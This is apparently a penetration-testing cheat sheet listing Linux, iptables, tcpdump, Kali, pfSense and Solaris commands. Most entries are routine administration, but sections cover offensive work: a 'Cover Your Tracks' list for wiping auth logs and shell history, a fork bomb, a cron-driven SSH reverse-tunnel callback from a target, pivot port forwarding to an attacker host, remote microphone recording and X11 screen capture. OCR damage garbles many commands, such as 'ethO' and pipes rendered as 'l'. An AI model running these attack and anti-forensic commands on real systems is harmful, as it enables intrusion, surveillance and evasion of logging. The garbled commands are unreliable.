---
layout: default
---

# \*nix

## Linux Network Commands

| **Command** | **Description** |
| :--- | :--- |
| watch ss -tp | Network connections |
| netstat -ant | Tcp connections -anu=udp |
| netstat -tulpn | Connections with PIDs |
| lsof -i | Established connections |
| smb:// ip /share | Access windows smb share |
| share user x.x.x.x c$ | Mount Windows share |
| smbclient -0 user\\ ip \ share | SMB connect |
| ifconfig eth\# ip I cidr | Set IP and netmask |
| ifconfig eth0:1 ip I cidr | Set virtual interface |
| route add default gw gw lp | Set GW |
| ifconfig eth\# mtu \[size\] | Change MTU size |
| export MAC=xx: XX: XX: XX: XX: XX | Change MAC |
| ifconfig int hw ether MAC | Change MAC |
| macchanger -m MAC int | Backtrack MAC changer |
| iwlist int scan | Built-in wifi scanner |
| dig -x ip | Domain lookup for IP |
| host ip | Domain lookup for IP |
| host -t SRV \_ service tcp.url.com | Domain SRV lookup |
| dig @ ip domain -t AXrR | DNS Zone Xfer |
| host -1 domain namesvr | DNS Zone Xfer |
| ip xfrm state list | Print existing VPN kejs |
| ip addr add ip I cidr aev ethO | Adds 'hidden' interface |
| /var/log/messages I grep DHCP | List DHCP assignments |
| tcpkill host ip and port port | Block ip:port |
| echo "1" /proc/sys/net/ipv4/ip forward | Turn on IP Forwarding |
| echo ''nameserver x.x.x.x''  /etc7resolv.conf | Add DNS Server |

## Linux System Info

| **Command** | **Description** |
| :--- | :--- |
| nbstate -A -ip | Get hostname for ip |
| id | Current username |
| w | Logged on users |
| who -a | User information |
| last -a | Last users logged on |
| ps -ef | Process listing \(top\) |
| df -h | Disk usage \(free\) |
| uname -a | Kernel version/CPU info |
| mount | Mounted file Sjstems |
| getent passwd | Show list of users |
| PATH~$PATH:/home/mypath | Add to PATH variable |
| kill pid | Kills process with pid |
| cat /etc/issue | Show OS info |
| cat /etc/'release' | Show OS version info |
| cat /proc/version | Show kernel info |
| rpm --query -all | Installed pkgs \(Redhat\) |
| rpm -ivh ' .rpm | Install RPM \(-e=remove\) |
| dpkg -get-selections | Installed pkgs \(Ubuntu\) |
| dpkg -I '.deb | Install DEB \(-r=remove\) |
| pkginfo | Installed pkgs \(Solaris\) |
| which tscsh/csh/ksh/bash | Show location of executable |
| chmod -so tcsh/csh/ksh | Disable shell , force bash |

## Linux Utility Commands

| **Command** | **Description** |
| :--- | :--- |
| wget http:// url -0 url.txt -o /dev/null | Grab url |
| rdesktop ip | Remote Desktop to ip |
| scp /tmp/file user@x.x.x.x:/tmp/file | Put file |
| scp user@ remoteip :/tmp/file /tmp/file | Get file |
| useradd -m user | Add user |
| passwd user | Change user password |
| rmuser unarne | Remove user |
| script -a outfile | Record shell : Ctrl-D stops |
| apropos subject | Find related command |
| history | View users command history |
| ! num | Executes line \# in history |

## Linux File Commands

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">diff filel file2</td>
      <td style="text-align:left">Compare files</td>
    </tr>
    <tr>
      <td style="text-align:left">rm -rf dir</td>
      <td style="text-align:left">Force delete of dir</td>
    </tr>
    <tr>
      <td style="text-align:left">shred -f -u file</td>
      <td style="text-align:left">Overwrite/delete file</td>
    </tr>
    <tr>
      <td style="text-align:left">touch -r ref file</td>
      <td style="text-align:left">Matches ref_ file timestamp</td>
    </tr>
    <tr>
      <td style="text-align:left">touch -t YYYYMMDDHHSS file</td>
      <td style="text-align:left">Set file timestamp</td>
    </tr>
    <tr>
      <td style="text-align:left">sudo fdisk -1</td>
      <td style="text-align:left">List connected drives</td>
    </tr>
    <tr>
      <td style="text-align:left">mount /dev/sda# /mnt/usbkey</td>
      <td style="text-align:left">Mount USB key</td>
    </tr>
    <tr>
      <td style="text-align:left">md5sum -t file</td>
      <td style="text-align:left">Compute md5 hash</td>
    </tr>
    <tr>
      <td style="text-align:left">echo -n &quot;str&quot; | md5sum</td>
      <td style="text-align:left">Generate md5 hash</td>
    </tr>
    <tr>
      <td style="text-align:left">shalsum file</td>
      <td style="text-align:left">SHAl hash of file</td>
    </tr>
    <tr>
      <td style="text-align:left">sort -u</td>
      <td style="text-align:left">Sort/show unique lines</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -c &apos;&apos;str&apos;&apos; file</td>
      <td style="text-align:left">Count lines w/ &apos;&apos;str&apos;&apos;</td>
    </tr>
    <tr>
      <td style="text-align:left">tar cf file.tar files</td>
      <td style="text-align:left">Create .tar from files</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xf file.tar</td>
      <td style="text-align:left">Extract .tar</td>
    </tr>
    <tr>
      <td style="text-align:left">tar czf file.tar.gz files</td>
      <td style="text-align:left">Create .tar.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xzf file.tar.gz</td>
      <td style="text-align:left">Extract .tar.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">tar cjf file.tar.bz2 files</td>
      <td style="text-align:left">Create .tar.bz2</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xjf file.tar.bz2</td>
      <td style="text-align:left">Extract .tar.bz2</td>
    </tr>
    <tr>
      <td style="text-align:left">gzip file</td>
      <td style="text-align:left">Compress/rename file</td>
    </tr>
    <tr>
      <td style="text-align:left">gzip -d file. gz</td>
      <td style="text-align:left">Decompress file.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">upx -9 -o out.exe orig.exe</td>
      <td style="text-align:left">UPX packs orig.exe</td>
    </tr>
    <tr>
      <td style="text-align:left">zip -r zipname.zip \Directory\&apos;</td>
      <td style="text-align:left">Create zip</td>
    </tr>
    <tr>
      <td style="text-align:left">dd skip=lOOO count=2000 bs=S if=file of=file</td>
      <td style="text-align:left">Cut block 1K-3K from file</td>
    </tr>
    <tr>
      <td style="text-align:left">split -b 9K file prefix</td>
      <td style="text-align:left">Split file into 9K chunks</td>
    </tr>
    <tr>
      <td style="text-align:left">awk &apos;sub(&quot;$&quot;.&quot;\r&quot;)&apos; unix.txt win.txt</td>
      <td
      style="text-align:left">Win compatible txt file</td>
    </tr>
    <tr>
      <td style="text-align:left">find -i -name file -type &apos;.pdf</td>
      <td style="text-align:left">Find PDF files</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>find I -perm -4000 -o -perm -2000 -exec ls -</p>
        <p>ldb {} \;</p>
      </td>
      <td style="text-align:left">Search for setuid files</td>
    </tr>
    <tr>
      <td style="text-align:left">dos2unix file</td>
      <td style="text-align:left">Convert to &apos;nix format</td>
    </tr>
    <tr>
      <td style="text-align:left">file file</td>
      <td style="text-align:left">Determine file type/info</td>
    </tr>
    <tr>
      <td style="text-align:left">chattr (+/-)i file</td>
      <td style="text-align:left">Set/Unset immutable bit</td>
    </tr>
  </tbody>
</table>## Linux Misc Commands

| **Command** | **Description** |
| :--- | :--- |
| unset HISTFILE | Disable history logging |
| ssh user@ ip arecord - I aplay - | Record remote mic |
| gcc -o outfile myfile.c | Compile C,C++ |
| init 6 | Reboot \(0 = shutdown\) |
| cat /etc/ 1 syslog 1 .conf 1 grep -v ''"\#'' | List of log files |
| grep 'href=' file 1 cut -d"/" -f3 I grep url \| sort -u | Strip links in url.com |
| dd if=/dev/urandom of= file bs=3145728 count=100 | Make random 3MB file |

## Linux "Cover Your Tracks" Commands



| **Command** | **Description** |
| :--- | :--- |
| echo "" /var/log/auth.log | Clear auth.log file |
| echo '''' -/.bash history | Clear current user bash history |
| rm -/.bash histor/ -rf | Delete .bash\_history file |
| history -c | Clear current session history |
| export HISTFILESIZE=0 | Set historj max lines to 0 |
| export HISTSIZE=0 | Set histroy max commands to 0 |
| unset HISTFILE | Disable history logging \(need to logout to take effect\) |
| kill -9 $$ | Kills current session |
| ln /dev/null -/.bash\_historj -sf | Perrnanentlj send all bash history commands to /dev/null |

Linux File System Structure

| **Location** | **Description** |
| :--- | :--- |
| /bin | User binaries |
| /boot | Boot-up related files |
| /dev | Interface for system devices |
| /etc | System configuration files |
| /home | Base directory for user files/lib |
| /opt | Critical software libraries |
| /proc | System and running programs |
| /root | Home directory of root user |
| /sbin | System administrator binaries |
| /tmp | Temporary files |
| /usr | Less critical files |
| /var | Variable System files |

## Linux Files

| **Filename** | **Description** |
| :--- | :--- |
| /etc/shadow | Local users' hashes |
| /etc/passwd | Local users |
| /etc/group | Local groups |
| /etc/rc.d | Startup services |
| /etc/init.d | Service |
| /etc/hosts | Known hostnames and IPs |
| /etc/HOSTNAME | Full hostnarne with domain |
| /etc/network/interfaces | Network configuration |
| /etc/profile | System environment variables |
| /etc/apt/sources.list | Ubuntu sources list |
| /etc/resolv.conf | Narneserver configuration |
| /horne/ user /.bash history | Bash history \(also /root/\) |
| /usr/share/wireshark/manuf | Vendor-MAC lookup |
| -/.ssh/ | SSH keystore |
| /var/log | System log files \(most Linux\) |
| /var/adrn | System log files \(Unix\) |
| /var/spool/cron | List cron files |
| /var/log/apache/access.log | Apache connection log |
| /etc/fstab | Static file system info |

## Linux Scripting

### Ping sweep

```text
for x in {1 .. 254 .. l};do ping -c 1 1.1.1.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done
```

### Automated domain name resolve bash script

```text
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l};do
host $range.$ip lgrep " name pointer " lcut -d"
done
```

### Fork bomb \(creates process until system "crashes"\)

```text
: (){:|: & };:
```

### dns reverse lookup

```text
for ip in {1 .. 254 .. 1}; do dig -x 1.1.1.$ip | grep $ip
dns.txt; done;
```

### Ip banning script

```text
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while
$i -le 253 l
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa
else
echo "IP NOT BANNED: 192.168.1.$i"
fi
i='expr $i +1`
done
```

### SSH Callback

```text
Set up script in crontab to callback every X minutes.
Highly recommend YOU
set up a generic user on red team computer (with no shell privs).
Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback: script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS=''domainl.com domain2.com domain3.com''
for LIVEHOST in SHOSTS;
do
    COUNT=S(ping -c2 $LIVEHOST | grep 'received' | awk -F','{ print $2 } '
    | awk ' ( print $1 | ')
    if [ [ $COUNT -gt 0 ] ] ; then
    ssh -R $(REMLIS}:localhost:22 -i
    "/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi
```

## Iptables

use ip6tables for ipv6 rules

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">iptables-save -c file</td>
      <td style="text-align:left">Dump iptables (with counters) rules to stdout</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables-restore file</td>
      <td style="text-align:left">Restore iptables rules</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -L -v --line-numbers</td>
      <td style="text-align:left">List all iptables rules with affected and line numbers</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -F</td>
      <td style="text-align:left">Flush all iptables rules</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>iptables -P INPUT/FORWARD/OUTPUT</p>
        <p>ACCEPT/REJECT/DROP</p>
      </td>
      <td style="text-align:left">Change default policy for rules that don&apos;t match rules</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -A INPUT -i interface -m state --state RELATED,ESTABLcSHED -j
        ACCEPT</td>
      <td style="text-align:left">Allow established connections on INPUT</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -D INPUT 7</td>
      <td style="text-align:left">Delete 7th inbound rule</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -t raw -L -n</td>
      <td style="text-align:left">Increase throughput by turning off statefulness</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -P INPUT DROP</td>
      <td style="text-align:left">Drop all packets</td>
    </tr>
  </tbody>
</table>## Allow SSH on port 22 outbound

```text
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state
NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i
iface -p tcp --sport 22 -m state --state
ESTABLISHED -j ACCEPT
```

## Allow ICMP outband

```text
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT
```

## Port forward

```text
echo "1" /proc/sys/net/ipv4/lp forward
# OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport
443 -to-destination attk ip :443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet
cidr -d attackip --dport 443 -to-source pivotip
iptables -t filter -I FORWARD 1 -j ACCEPT
```

## Allow only 1.1.1.0/24, ports 80,443 and log drops to /var/log/messages

```text
iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW
-p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o ethO -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED "
iptables -A LOGGING -j DROP
```

## Update-rc.d

check/change startup services

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">service --status-all</td>
      <td style="text-align:left">
        <p>[+] Service starts at boot</p>
        <p>[-] Service does not start</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">service service start</td>
      <td style="text-align:left">Start a service</td>
    </tr>
    <tr>
      <td style="text-align:left">service service stop</td>
      <td style="text-align:left">Stop a service</td>
    </tr>
    <tr>
      <td style="text-align:left">service service status</td>
      <td style="text-align:left">Check status of a service</td>
    </tr>
    <tr>
      <td style="text-align:left">update-rc.d -f service remove</td>
      <td style="text-align:left">Remove a service start up cmd (-f if the /etc/init.d start up file exists)</td>
    </tr>
    <tr>
      <td style="text-align:left">update-rc.d service defaults</td>
      <td style="text-align:left">Add a start up service</td>
    </tr>
  </tbody>
</table>## Chkconfig

Available in linux distributions such as red hat enterprise linux\(RHEL\), centos and oracle enterprise linux\(OEL\)



| **Command** | **Description** |
| :--- | :--- |
| chkconfig --list | List existing services and run status |
| chkconfig service -list | Check single service status |
| chkconfig service on \[--level 3\] | Add service \[optional to add level at which service runs\] |
| chkconfig service off \[--level 3\] e.g. chkconfig iptables off | Remove service |

## Screen

| **Command** | **Description** |
| :--- | :--- |
| screen -S name | Start new screen with name |
| screen -ls | List running screens |
| screen -r name | Attach to screen name |
| screen -S name -X cmd | Send crnd to screen anrne |
| C-a ? | List keybindings \(help\) |
| C-a d | Detach |
| C-a D D | Detach and logout |
| C-a c | Create new window |
| C-a C-a | Switch to last active window |
| C-a ' num\|name | Switch to window numlname |
| C-a " | See windows list and change |
| C-a k | Kill current window |
| C-a S | Split display horizontally |
| C-a V | Split display vertically |
| C-a tab | Jump to next display |
| C-a X | Remove current region |
| C-a Q | Remove all regions but current |

## X11

### Capture remote X11 windows and convert to JPG

```text
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
```

### Open X11 stream viewing

```text
xwd -display 1.1.1.1:0 -root -silent -out x11dump
Read dumped file with xwudtopnm or GIMP
```

## TCPDump

### Capture packets on eth0 in ASCII and hex and write to file

```text
tcpdump -i ethO -XX -w out.pcap
```

### Capture HTTP traffic to 2.2.2.2

```text
tcpdump -i ethO port 80 dst 2.2.2.2
```

### Show connections to a specific IP

```text
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24
```

Print all ping response

```text
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
```

### Capture 50 DNS packets and print timestamp

```text
tcpdump -i ethO -c 50 -tttt 'udp and port 53'
```

## Native KALI commands

### WMIC equivalent

```text
wmis -U DOMAIN\ user % password //DC cmd.exe /c command
```

### Mount SMB share

```text
# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
mount.cifs // ip /share /mnt/share -o
user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw
```

### Updating KALI

```text
apt-get update
apt-get upgrade
```

## PFSENSE



| **Command** | **Description** |
| :--- | :--- |
| pfSsh.php | pfSense Shell System |
| pfSsh.php playback enableallowallwan | Allow all inbound WAN connections \(adds to visible rules in WAN rules\) |
| pfSsh.php playback enablesshd | Enable ssh inbound/outbound |
| pfctl -sn | Show NAT rules |
| pfctl -sr | Show filter rules |
| pfctl -sa | Show all rules |
| viconfig | Edit config |
| rm /tmp/config.cache | Remove cached \(backup\) config after editing the current running |
| /etc/rc.reload\_all | Reload entire config |

## SOLARIS

| **Command** | **Description** |
| :--- | :--- |
| ifconfig -a | List of interfaces |
| netstat -in | List of interface |
| ifconfig -r | Route listing |
| ifconfig eth0 dhcp | Start DHCP client |
| ifconfig eth0 plumb up ip netmask nmask | Set IP |
| route add default ip | Set gateway |
| logins -p | List users w/out passwords |
| svcs -a | List all services w/ status |
| prstat -a | Process listing \(top\) |
| svcadm start ssh | Start SSH service |
| inetadm -e telnet \(-d for disable\) | Enable telnet |
| prtconf I grep Memorj | Total physical memory |
| iostat -En | Hard disk size |
| showrev -c /usr/bin/bash | Information on a binary |
| shutdown -i6 -g0 -y | Restart system |
| dfmounts | List clients connected NFS |
| smc | Management GUI |
| snoop -d int -c pkt \# -o results.pcap | Packet capture |
| /etc/vfstab | File system mount table |
| /var/adm/logging | Login attempt log |
| /etc/default/' | Default settings |
| /etc/system | Kernel modules & config |
| /var/adm/messages | Syslog location |
| /etc/auto ' | Automounter config files |
| /etc/inet/ipnodes | IPv4/IPv6 host file |

